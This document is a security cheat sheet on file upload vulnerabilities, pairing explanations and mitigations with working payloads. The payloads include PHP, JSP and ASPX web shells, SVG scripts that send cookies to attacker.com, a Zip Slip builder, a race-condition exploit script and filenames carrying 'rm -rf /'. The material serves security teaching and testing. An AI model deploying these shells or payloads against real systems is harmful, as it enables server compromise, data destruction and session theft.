📌 1. Unrestricted File Upload

What is Unrestricted File Upload?

The application allows uploading any file type without any validation. Attackers can upload malicious files (PHP, JSP, ASPX, etc.) to execute code on the server.

Why does it occur?

Lack of input validation on file types, missing extension checks, and no content verification.

Security principle violated: Input Validation / Secure Configuration

Real-world analogy: Like a security guard who checks IDs but lets anyone in regardless of what the ID says.

🏷️ Classification

  • Type: Unrestricted File Upload
  • OWASP: A05:2021 – Security Misconfiguration
  • CWE: CWE-434: Unrestricted Upload of File with Dangerous Type

🎯 Attack Surface

  • ✅ Profile picture upload
  • ✅ Document/Attachment upload
  • ✅ Theme/Plugin upload (WordPress, etc.)
  • ✅ CSV/Excel import features
  • ✅ Avatar/Logo upload

🔍 Detection Methodology

1. Static Analysis (Source Code)

// Vulnerable code pattern
move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $_FILES['file']['name']);
// No validation on file type or extension

2. Dynamic Analysis (Burp Suite / Manual)

  • Attempt to upload shell.php
  • Check if upload succeeds
  • Try to access uploaded file

💣 Basic Payloads

shell.php
shell.jsp
shell.aspx
shell.phtml
shell.php5
shell.php7
shell.Php (case manipulation)
shell.PHP
<?php system($_GET['cmd']); ?>           # PHP webshell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>   # JSP webshell
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>   # ASPX webshell

🚀 Advanced Payloads / Bypass

# Obfuscated PHP webshell
<?php $cmd = $_GET['cmd']; system($cmd); ?>

# Encoded webshell
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7')); ?>

# Short tag webshell
<?= shell_exec($_GET['cmd']); ?>

🧪 Test Cases (STRICT)

StepActionExpectedActual
1Upload shell.phpRejectedUpload successful
2Access /uploads/shell.php404 Not Found200 OK
3Execute ?cmd=idNo outputCommand output

⚙️ Exploitation Steps

  1. Identify file upload functionality
  2. Attempt to upload shell.php
  3. If successful, navigate to uploaded file
  4. Execute commands via webshell
  5. Escalate to full server compromise

🛡️ Mitigation

✅ Allowlist Extensions: Only allow safe extensions (jpg, png, gif, pdf, txt)
✅ Validate File Content: Check magic bytes, not just extension
✅ Rename Uploaded Files: Use random names, remove original extension
✅ Store Files Outside Webroot: Prevent direct access
✅ Disable Execution: Configure upload directory to disable script execution
✅ Set Proper Permissions: 644 for files, 755 for directories 
# Secure implementation (PHP)
$allowed = ['jpg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die('Invalid file type');
}
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $new_name);

Impact:

  • Data Theft
  • Website Defacement
  • Persistence / Backdoor Installation

📌 2. MIME Type Bypass

What is MIME Type Bypass?

The server checks only the Content-Type header. Attackers can modify the MIME type to bypass validation.

Why does it occur?

Server trusts client-supplied Content-Type header instead of validating actual file content.

Security principle violated: Input Validation / Trust Boundary

🏷️ Classification

  • Type: MIME Type Bypass
  • OWASP: A05:2021 – Security Misconfiguration
  • CWE: CWE-434: Unrestricted Upload

🎯 Attack Surface

  • ✅ File upload endpoints with Content-Type validation only
  • ✅ API endpoints accepting multipart/form-data
  • ✅ Applications using getMimeType() without content verification

🔍 Detection Methodology

1. Static Analysis

// Vulnerable code - only checks Content-Type header
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file(...);
}

2. Dynamic Analysis

  • Intercept upload request in Burp Suite
  • Modify Content-Type header to allowed value
  • Observe if upload succeeds

💣 Basic Payloads

# Change Content-Type header to:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: application/pdf
Content-Type: text/plain

🚀 Advanced Payloads

# Using curl
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# Multiple content-type headers
Content-Type: image/jpeg
Content-Type: application/x-php

🧪 Test Cases

StepActionExpectedActual
1Upload shell.php with Content-Type: image/jpegRejectedUpload successful
2Access uploaded fileNo executionPHP code executes

⚙️ Exploitation Steps

  1. Intercept file upload request in Burp Suite
  2. Change Content-Type header to allowed type (image/jpeg)
  3. Forward request and check if upload succeeded
  4. Access uploaded shell to confirm execution

🛡️ Mitigation

✅ Validate File Content: Check magic bytes/file signatures, not Content-Type header
✅ Use Server-Side Validation: Never trust client-supplied headers
✅ Implement File Type Detection: Use libraries like file, libmagic, or finfo 
# PHP - Validate actual file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
    die('Invalid file type');
}

⚠️ Risk / Impact

Severity: High to Critical

Impact: Remote Code Execution, Server Compromise

📎 Proof of Concept (PoC)

Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>

📌 3. Extension Blacklist Bypass

What is Extension Blacklist Bypass?

The server blocks specific extensions but misses others. Attackers use alternative extensions that still execute.

Why does it occur?

Incomplete blacklist - only blocks common extensions like .php, missing .php3, .php4, .phtml, etc.

Security principle violated: Input Validation

🏷️ Classification

  • Type: Extension Blacklist Bypass
  • OWASP: A05:2021 – Security Misconfiguration
  • CWE: CWE-434: Unrestricted Upload

🎯 Attack Surface

  • ✅ Applications using blacklist-based validation
  • ✅ Upload functionality with incomplete extension filtering

💣 Basic Payloads

shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
shell.inc
shell.module
shell.php.jpg  # Apache misconfiguration

🚀 Advanced Payloads

# Case manipulation
shell.Php
shell.PHP
shell.pHp

# Double extensions
shell.php.jpg
shell.php.png

🧪 Test Cases

StepActionExpectedActual
1Upload shell.phpBlockedBlocked
2Upload shell.phtmlBlockedUpload successful

⚙️ Exploitation Steps

  1. Identify blocked extensions by testing common ones
  2. Try alternative extensions that still execute
  3. Upload successful payload
  4. Access and execute

🛡️ Mitigation

✅ Use Allowlist, not Blacklist: Only allow safe extensions
✅ Comprehensive Extension Check: Include all executable extensions
✅ Rename Files: Remove original extension entirely
✅ Disable Execution: Prevent script execution in upload directory

⚠️ Risk / Impact

Severity: High to Critical

Impact: Remote Code Execution

📌 4. Double Extension Attack

What is Double Extension Attack?

Using double extensions like .jpg.php to bypass extension checks while maintaining execution capability.

Why does it occur?

Apache misconfiguration where AddHandler or AddType directives cause double extensions to execute.

Security principle violated: Configuration Management

🏷️ Classification

  • Type: Double Extension Attack
  • CWE: CWE-434: Unrestricted Upload

💣 Basic Payloads

shell.jpg.php
shell.png.php5
shell.gif.phtml
shell.jpeg.php7
shell.bmp.php3

🚀 Advanced Payloads

# Multiple extensions
shell.php.jpg.png.gif
shell.php.jpg;.gif

# Using .htaccess
AddType application/x-httpd-php .jpg

⚙️ Exploitation Steps

  1. Upload file with double extension (shell.jpg.php)
  2. Check if server executes based on last extension
  3. If Apache misconfigured, shell executes

🛡️ Mitigation

✅ Disable Multiple Extensions: Configure server to only recognize single extensions
✅ Rename Files: Generate new random names, strip all extensions
✅ Secure Apache Configuration: Don't use AddHandler on upload directories 
# Apache configuration to prevent execution in upload directory
<Directory /var/www/html/uploads>
    php_flag engine off
    AddType text/plain .html .htm .shtml .php .phtml
</Directory>

⚠️ Risk / Impact

Severity: High

Impact: Remote Code Execution

📚 References

  • HackTricks: Double Extensions

📌 5. Null Byte Injection

What is Null Byte Injection?

Using null byte (%00) to terminate string prematurely, tricking the server about file extension.

Why does it occur?

Vulnerable in older PHP versions (<5.3.4) and C-based file operations where null byte terminates string.

Security principle violated: Input Validation

🏷️ Classification

  • Type: Null Byte Injection
  • CWE: CWE-158: Improper Neutralization of Null Byte

💣 Basic Payloads

shell.php%00.jpg
shell.php%00.png
shell.php%00.gif

# URL encoded
shell.php%00.jpg
shell.php%252E%252E

⚙️ Exploitation Steps

  1. Intercept upload request in Burp Suite
  2. Add %00 null byte before allowed extension
  3. Server truncates filename at null byte
  4. File saved as shell.php, bypasses extension check

🛡️ Mitigation

✅ Update PHP Version: Use PHP 5.3.4+ which patches null byte issue
✅ Sanitize Filenames: Remove null bytes before processing
✅ Use Random Names: Don't use user-supplied filenames

⚠️ Risk / Impact

Severity: High (depends on PHP version)

Impact: Remote Code Execution on vulnerable versions

📚 References

  • OWASP: Null Byte Injection

📌 6. ImageTragick (CVE-2016-3714)

What is ImageTragick?

ImageMagick vulnerability allowing remote code execution via specially crafted image files.

Why does it occur?

ImageMagick allows processing of system commands through certain image formats.

Security principle violated: Input Validation / Secure Configuration

🏷️ Classification

  • Type: RCE via Image Processing
  • CVE: CVE-2016-3714
  • CVSS: 7.8 (High)

💣 Basic Payloads

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" 
  xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="|id" width="0" height="0"/>
</svg>
# MVG file payload
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context

⚙️ Exploitation Steps

  1. Create malicious SVG/MVG file with command payload
  2. Upload to application that processes images with ImageMagick
  3. Command executes on server

🛡️ Mitigation

✅ Update ImageMagick: Install patched version
✅ Disable Vulnerable Coders: Disable MVG, EPHEMERAL, URL coders
✅ Use Policy File: Configure /etc/ImageMagick/policy.xml 
<!-- ImageMagick policy.xml -->
<policymap>
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
</policymap>

⚠️ Risk / Impact

Severity: High to Critical

Impact: Remote Code Execution

📌 7. Zip Slip (Path Traversal in ZIP)

What is Zip Slip?

Malicious ZIP files containing filenames with ../ sequences can write files outside the intended directory.

Why does it occur?

Applications extract ZIP files without validating filenames for path traversal sequences.

Security principle violated: Input Validation

🏷️ Classification

  • Type: Path Traversal
  • CWE: CWE-22: Improper Limitation of a Pathname

💣 Payload Creation

# Python script to create malicious ZIP
python3 -c '
import zipfile
zf = zipfile.ZipFile("malicious.zip", "w")
zf.writestr("../../../../var/www/html/shell.php", "<?php system($_GET[cmd]); ?>")
zf.close()'

⚙️ Exploitation Steps

  1. Create ZIP with path traversal filenames
  2. Upload ZIP to application that extracts it
  3. Files written outside target directory
  4. Can overwrite critical files or write webshells

🛡️ Mitigation

✅ Validate ZIP Entries: Check each filename for ../ sequences
✅ Use Safe Extraction: Normalize paths and verify within target directory
✅ Update Libraries: Use patched ZIP libraries 
# Java - Secure ZIP extraction
Enumeration<ZipEntry> entries = zip.getEntries();
while (entries.hasMoreElements()) {
    ZipEntry entry = entries.nextElement();
    File destFile = new File(targetDir, entry.getName());
    String destPath = destFile.getCanonicalPath();
    if (!destPath.startsWith(targetDir.getCanonicalPath())) {
        throw new Exception("Zip Slip detected!");
    }
}

⚠️ Risk / Impact

Severity: High

Impact: Arbitrary File Write, Remote Code Execution

📌 8. SVG XSS via Upload

What is SVG XSS?

SVG files can contain JavaScript that executes when rendered in browser, leading to Stored XSS.

Why does it occur?

Applications allow SVG uploads without sanitizing embedded JavaScript.

Security principle violated: Output Encoding

🏷️ Classification

  • Type: Stored XSS
  • OWASP: A03:2021 – Injection
  • CWE: CWE-79: Improper Neutralization of Input

💣 Basic Payloads

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">

<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <image href="javascript:alert(1)"/>
</svg>

🚀 Advanced Payloads

<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" onload="location.href='https://attacker.com/steal?c='+document.cookie">

⚙️ Exploitation Steps

  1. Create SVG with JavaScript payload
  2. Upload as profile picture or image
  3. When any user views the SVG, XSS executes
  4. Steal cookies, session tokens, or perform actions

🛡️ Mitigation

✅ Disable SVG Uploads: If not needed, block entirely
✅ Sanitize SVG: Remove script tags and event handlers
✅ Serve with Content-Type: Use image/svg+xml with CSP headers
✅ Use CSP: Block inline script execution

⚠️ Risk / Impact

Severity: Medium to High

Impact: Session Hijacking, Data Theft, Account Takeover

📚 References

  • OWASP: XSS

📌 9. XML Bomb via Upload

What is XML Bomb?

Uploading malicious XML files to cause Denial of Service via entity expansion (Billion Laughs attack).

Why does it occur?

XML parsers process external entities and recursive expansions without limits.

Security principle violated: Input Validation

🏷️ Classification

  • Type: Denial of Service
  • CWE: CWE-776: XML Entity Expansion

💣 Basic Payloads

<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>

⚙️ Exploitation Steps

  1. Create XML file with entity expansion
  2. Upload to application that parses XML
  3. Parser expands entities exponentially
  4. Memory exhaustion causes DoS

🛡️ Mitigation

✅ Disable External Entities: Configure parser to reject DTDs
✅ Set Entity Limits: Limit entity expansion depth
✅ Use Secure Parsers: JSON over XML when possible

⚠️ Risk / Impact

Severity: Medium (DoS)

Impact: Denial of Service, Memory Exhaustion

📚 References

  • OWASP: XML Entity Expansion

📌 10. Race Condition on File Upload

What is Race Condition on File Upload?

Exploiting timing between file save and validation checks to execute malicious files before deletion.

Why does it occur?

Application saves file first, then validates, giving a window to execute before validation.

Security principle violated: Secure Design

🏷️ Classification

  • Type: Race Condition
  • CWE: CWE-362: Concurrent Execution

💣 Exploit Code

import requests, threading

def upload_file():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('https://target.com/upload', files=files)

def access_shell():
    while True:
        r = requests.get('https://target.com/uploads/shell.php')
        if r.status_code == 200:
            print("Shell accessible!")
            break

threading.Thread(target=upload_file).start()
threading.Thread(target=access_shell).start()

⚙️ Exploitation Steps

  1. Start thread uploading malicious file
  2. Start thread continuously accessing uploaded file
  3. Access may succeed before validation/deletion
  4. Execute code during race window

🛡️ Mitigation

✅ Validate Before Save: Complete all validation before writing file
✅ Use Temporary Storage: Save to non-executable location first
✅ Atomic Operations: Use file locking or atomic moves
✅ Rename After Validation: Use random names only after validation

⚠️ Risk / Impact

Severity: High

Impact: Remote Code Execution (race-dependent)

📚 References

  • PortSwigger: Race Conditions

📌 11. File Name Injection

What is File Name Injection?

Injecting malicious content via file name that gets reflected in responses or logs.

Why does it occur?

Application reflects filename without proper encoding or sanitization.

Security principle violated: Output Encoding

🏷️ Classification

  • Type: Injection
  • CWE: CWE-79, CWE-93, CWE-116

💣 Basic Payloads

# XSS via filename
<script>alert(1)</script>.jpg
<img src=x onerror=alert(1)>.png

# Command injection via filename
; rm -rf / ;.jpg
| whoami .png
$(id).gif

# Log injection
test.jpg
test.jpg\nUser logged in as admin

⚙️ Exploitation Steps

  1. Upload file with malicious filename
  2. Check where filename is displayed (page, logs, emails)
  3. If displayed without encoding, XSS/Injection occurs

🛡️ Mitigation

✅ Rename Files: Generate random names, ignore user input
✅ Encode Output: Always encode filename when displaying
✅ Sanitize Input: Remove special characters from filenames
✅ Escape Logs: Properly escape log entries

⚠️ Risk / Impact

Severity: Low to Medium

Impact: XSS, Log Injection, Command Injection

📚 References

  • OWASP: Log Injection

📌 12. Web Shell Upload

What is Web Shell Upload?

Uploading fully functional web shells to maintain persistent access and execute commands.

Why does it occur?

Successful bypass of all upload protections leads to webshell deployment.

Security principle violated: Multiple (Upload, Execution, Access Control)

🏷️ Classification

  • Type: Web Shell
  • CWE: CWE-434: Unrestricted Upload

💣 PHP Web Shells

<?php system($_GET['cmd']); ?>

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

<?php exec($_GET['cmd'], $output); print_r($output); ?>

💣 JSP Web Shell

<% if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}%>

💣 ASP/ASPX Web Shell

<%@ Page Language="C#" %>
<%
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
    }
%>

⚙️ Exploitation Steps

  1. Upload webshell using any bypass technique
  2. Access webshell via browser
  3. Execute system commands
  4. Establish persistent access
  5. Pivot to internal network

🛡️ Mitigation

✅ Disable Execution: No execution in upload directories
✅ File Type Allowlist: Only allow safe file types
✅ Rename Files: Random names, strip extensions
✅ Store Outside Webroot: Prevent direct access
✅ Monitor Uploads: Scan for webshell signatures
✅ WAF Rules: Detect common webshell patterns 
# Apache - Disable PHP execution in uploads
<Directory /var/www/html/uploads>
    php_flag engine off
    AddType text/plain .php .phtml .php5
</Directory>

# Nginx - Disable script execution
location /uploads {
    location ~ .*\.(php|php5|phtml)$ {
        return 403;
    }
}

⚠️ Risk / Impact

Severity: Critical

Impact: Full Server Compromise, Data Theft, Persistence, Lateral Movement

🛡️ General Mitigation (All File Upload Vulnerabilities)

✅ Allowlist Extensions: Only allow safe extensions (jpg, png, gif, pdf, txt)
✅ Validate File Content: Check magic bytes/file signatures
✅ Rename Uploaded Files: Use random names, never trust user filenames
✅ Store Files Outside Webroot: Prevent direct access to uploaded files
✅ Disable Execution: Configure upload directory to disable script execution
✅ Scan for Malware: Use ClamAV or similar antivirus
✅ Set Proper Permissions: 644 for files, 755 for directories
✅ Image Re-encoding: Re-encode images to remove malicious content
✅ Update Libraries: Keep ImageMagick, GD, and other libraries updated
✅ Use CSP Headers: Content Security Policy for SVG XSS prevention
✅ Implement Rate Limiting: Prevent race condition attacks
